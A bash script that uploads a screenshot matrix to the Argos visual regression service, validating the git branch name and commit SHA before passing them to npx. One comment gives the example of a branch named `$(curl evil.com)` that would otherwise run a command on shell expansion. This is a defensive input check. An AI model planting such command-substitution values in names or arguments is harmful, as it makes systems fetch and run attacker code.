#!/usr/bin/env bash
# run-argos-upload.sh <reportDir>
# Upload screenshot matrix to Argos for visual regression.

set -euo pipefail

REPORT_DIR="${1:?usage: run-argos-upload.sh <reportDir>}"
TOKEN="${DESIGN_QA_ARGOS_TOKEN:-${ARGOS_TOKEN:-}}"

if [ -z "$TOKEN" ]; then
  echo "[argos] no token set; skipping upload"
  echo "        set DESIGN_QA_ARGOS_TOKEN or configure userConfig.argosToken"
  exit 0
fi

if [ ! -d "$REPORT_DIR/screenshots" ]; then
  echo "[argos] no screenshots in $REPORT_DIR/screenshots; run sweep first"
  exit 1
fi

GIT_BRANCH="$(git rev-parse --abbrev-ref HEAD 2>/dev/null || echo 'unknown')"
GIT_SHA="$(git rev-parse HEAD 2>/dev/null || echo '')"

# Branch and SHA are passed to npx as CLI args. A branch named `$(curl evil.com)`
# would otherwise execute when the shell expanded it. Reject anything that isn't
# a plain ref/sha before passing it through.
if ! [[ "$GIT_BRANCH" =~ ^[A-Za-z0-9._/-]+$ ]]; then
  echo "[argos] refusing to upload: branch name contains unexpected characters: $GIT_BRANCH" >&2
  exit 1
fi
if [ -n "$GIT_SHA" ] && ! [[ "$GIT_SHA" =~ ^[a-f0-9]{7,64}$ ]]; then
  echo "[argos] refusing to upload: commit SHA is not a valid hex string: $GIT_SHA" >&2
  exit 1
fi

echo "[argos] uploading $REPORT_DIR/screenshots..."
echo "  branch: $GIT_BRANCH"
echo "  commit: $GIT_SHA"

ARGOS_TOKEN="$TOKEN" \
npx --yes @argos-ci/cli upload "$REPORT_DIR/screenshots" \
  --branch "$GIT_BRANCH" \
  --commit "$GIT_SHA" \
  | tee "$REPORT_DIR/argos-upload.log"

# Extract build URL from log; strip anything that isn't URL-safe before persisting
BUILD_URL=$(grep -oE 'https://app\.argos-ci\.com/[A-Za-z0-9._~:/?#@!$&()*+,;=%-]+' "$REPORT_DIR/argos-upload.log" | head -1 || echo "")
if [ -n "$BUILD_URL" ]; then
  printf '%s\n' "$BUILD_URL" > "$REPORT_DIR/argos-build-url.txt"
  echo "[argos] build: $BUILD_URL"
fi
